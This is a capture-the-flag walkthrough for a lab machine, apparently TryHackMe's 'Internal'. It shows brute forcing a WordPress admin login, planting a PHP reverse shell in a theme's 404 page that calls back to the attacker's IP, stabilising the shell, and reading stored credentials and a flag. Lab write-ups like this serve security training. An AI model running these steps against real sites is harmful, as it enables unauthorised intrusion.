# Internal-Writeup
## Recon

Machine booted, let's see if it is up with some pings
```
ping 10.10.247.233                         
PING 10.10.247.233 (10.10.247.233) 56(84) bytes of data.
64 bytes from 10.10.247.233: icmp_seq=1 ttl=63 time=80.8 ms
64 bytes from 10.10.247.233: icmp_seq=2 ttl=63 time=81.8 ms
^C
--- 10.10.247.233 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 80.812/81.283/81.754/0.471 ms
```

Machine is up, let's do some basic port scan
`nmap -p- -O -A -sV 10.10.247.233`
Output:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.2 - 4.9 (93%), Linux 3.7 - 3.10 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   57.43 ms 10.8.0.1
2   57.51 ms internal.thm (10.10.247.233)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.97 seconds
```
Interesting. No more ports open besite http. This will be web based penetration testing.

## Web application recon
MANUAL:
- Index page is showing the default ubuntu-apache page. No significant html comments are made inside
- robots.txt sitemap.xml php.ini and more files give 404. There must be some directories that are hosting website outside /var/www/html so we will have to switch to automated method or brute forcing directories

AUTOMATED:
- Using dirbuster we brute forced directories on given server.
Results:
```
/phpmyadmin/ (shows login page of phpmyadmin, not outdated vulnerable version)
/blog/ (dirbuster detected some basic wordpress directories and files which confirms this is wordpress based website)
```

While looking at the index page of blog we only see basic page with twentyseventeen theme. 
Looking at source code we don't see anything crucial, we can see plugins, themes, some uploads but nothing crucial.
As I checked for robots.txt which returned 404 i remembered i should check for sitemap.xml which can give me informations about users and authors which i can later brute force on login if i don't find any vulnerable theme or plugin.
But sitemap.xml returned 404 so i ran my tool which enumerates authors and usernames through the archives and posts.
We got username `admin` which we will note for the case where we don't find any vulnerability.
For scanning vulnerabilities on wordpress websites we will use `WPscan` which is great enumeration and vulnerability scanning tool.
Unfortunately we found 39 vulnerabilities which are probably not intentionally left there so we will brute force login with same tool and we can get back to those CVEs later.

Using a `/usr/share/wordlists/rockyou.txt` wordlist we will attack the wp-login.php page which is located in `http://internal.thm/blog/wp-login.php`.
Bingo! `Valid Combinations Found: Username admin, Password my2boys`
We will use these given credentials to login on the admin panel
`admin:my2boys`

## Getting access
After successfully logging in the admin panel, we get prompted with question if we want to update the admin email or leave it as it is.
We will skip on this one because our goal is getting webshell or reverse shell.
For this purposes idea is to edit built-in pages with the malicious code which will execute under condition that we visit website.

So twentyseventeen is a theme. Themes got their own custom 404 page that will run when you visit non-existing page. So for a fact we know that we can modify that page which we will do.
Through the admin panel, we can see the side menu on left side which contains tab themes.
So the path is `Themes>>Theme editor>>404.php`

`https://github.com/pentestmonkey/php-reverse-shell`is great for these purposes as it can run as logic bomb when visited. You can download it, modify by just adding your ip address and port as following:
```
$ip = '10.8.22.53';  // CHANGE THIS TO YOUR IP
$port = 1234;       // CHANGE THIS TO WANTED PORT
```
And you can finally start your connection listener on all interfaces by running `nc -lvnp 1234` in your command line.
After pasting whole reverse shell code in the 404 template you can press `Publish` and visit the page with following url http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
Bingo! Reverse shell!
```
$ nc -lvnp 1234            
listening on [any] 1234 ...
connect to [10.8.22.53] from (UNKNOWN) [10.10.247.233] 54424
Linux internal 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 18:52:46 up  3:37,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ 
```
We got access as `www-data`

## Internal recon
So we got the reverse shell which is unstable to use and which i don't recommend for holding onto on longer pentests. So we will stabilise it by running:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo; fg
Press ENTER
export TERM=xterm
```
This would make it more stable and better looking and even more useful.
By trying to visit `/home` directory we encounter `aubreanna` to which we do not have access to enter. So privilege escalation takes part here.
We are unable to run `sudo -l` but remember we are www-data. We can download and run linpeas and polkits and more if we don't find anything significant.

With enumerations script and techniques we did not find anything that would help us escalate privileges beside modern vulnerabilities that would be considered cheating as the machine is not intended to be used that way.
Linpeas-ng leads us to /opt directory with sensitive file containing credentials called wp-save.txt which content is this:
```
www-data@internal:/opt$ cat wp-save.txt
Bill,
Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
aubreanna:bubb13guM!@#123
```
By running `su aubreanna` we are becoming that user!
Now we will go and examine home directory
```
aubreanna@internal:/opt$ cd ~
aubreanna@internal:~$ ls
jenkins.txt  snap  user.txt
aubreanna@internal:~$ cat user.txt
THM{int3rna1_fl4g_1}
aubreanna@internal:~$
```
Hmm but what is this `jenkins.txt` let's see.
```
aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
```
Let's check if it is still running with netstat.
`tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     `
and yes, it is running.
